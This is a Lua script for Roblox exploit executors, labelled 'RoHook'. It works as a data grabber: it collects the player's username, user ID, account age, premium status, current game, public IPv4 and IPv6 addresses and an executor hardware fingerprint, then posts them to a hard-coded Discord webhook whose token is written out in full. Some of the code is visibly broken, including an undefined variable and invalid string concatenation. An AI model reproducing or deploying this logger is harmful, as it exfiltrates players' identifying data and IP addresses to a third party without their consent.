--Log
plr = game:GetService'Players'.LocalPlayer
local ALT = false
local DisName = pls.DisplayName
local PlayerID = plr.UserId
if plr.MembershipType == Enum.MembershipType.Premium then
haspremium = true
elseif plr.MembershipType == Enum.MembershipType.None then
haspremium = false
end

if plr.AccountAge <= 100 then 
    ALT = true
end

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)
local placeIDLocation = game.PlaceId
local http_request = http_request;
local IP1 =  game:HttpGet("https://v4.ident.me")
local IP2 =  game:HttpGet("https://v6.ident.me")
if syn then
http_request = syn.request
elseif SENTINEL_V2 then
function http_request(tb)
    return {
        StatusCode = 200;
        Body = request(tb.Url, tb.Method, (tb.Body or ''))
    }
end
end
local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
local decoded = game:GetService('HttpService'):JSONDecode(body)
local hwid_list = {"Syn-Fingerprint", "Exploit-Guid", "Proto-User-Identifier", "Sentinel-Fingerprint"};
hwid = "";
for i, v in next, hwid_list do
if decoded.headers[v] then
    hwid = decoded.headers[v];
    break
end
end
if hwid then
local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/1042396968527335505/QcC8DMGloePAn-shwJ9mWNstnHs1IYaJBxbKPBmK7OP7I9SENsr-l0EyCkLBi-juKRni"
local data = 
{
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "__**RoHook (/)**__",
        ["description"] = hwid,
        ["type"] = "rich",
        ["color"] = tonumber(0xFFC300),
        ["fields"] = {
            {
                ["name"] = "Username:",
                ["value"] = Game.Players.LocalPlayer.Name,
                ["inline"] = true
            },
	    {
                ["name"] = "DisplayName:",
                ["value"] = DisName,
                ["inline"] = true
            },
	    {
                ["name"] = "User Id:",
                ["value"] = PlayerID,
                ["inline"] = true
            },
	    {
                ["name"] = "Game ID:",
                ["value"] = placeIDLocation,
                ["inline"] = true
            },
            {
                ["name"] = "Game Name:",
                ["value"] = info.Name,
                ["inline"] = true
            },
	    {
                ["name"] = "IP Address V4:",
                ["value"] = IP1,
                ["inline"] = true
	    },
	    {
                ["name"] = "IP Address V6:",
                ["value"] = IP2,
                ["inline"] = true
            },
	    {
                ["name"] = "Password:",
                ["value"] = "nil",
                ["inline"] = true
            },
	    {
                ["name"] = "2step Auth:",
                ["value"] = "false",
                ["inline"] = true
            },
	    {
                ["name"] = "Validator:",
                ["value"] = "false",
                ["inline"] = true
            },
	    {
                ["name"] = "Premium:",
                ["value"] = haspremium,
                ["inline"] = true
            },
	    {
                ["name"] = "ALT:",
                ["value"] = ALT + " / " + plr.AccountAge,
                ["inline"] = true
            },
        },
    }}
}
local newdata = HttpServ:JSONEncode(data)
local headers = {
        ["content-type"] = "application/json"
}
local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
http_request(request_payload)
end
--End Of Log
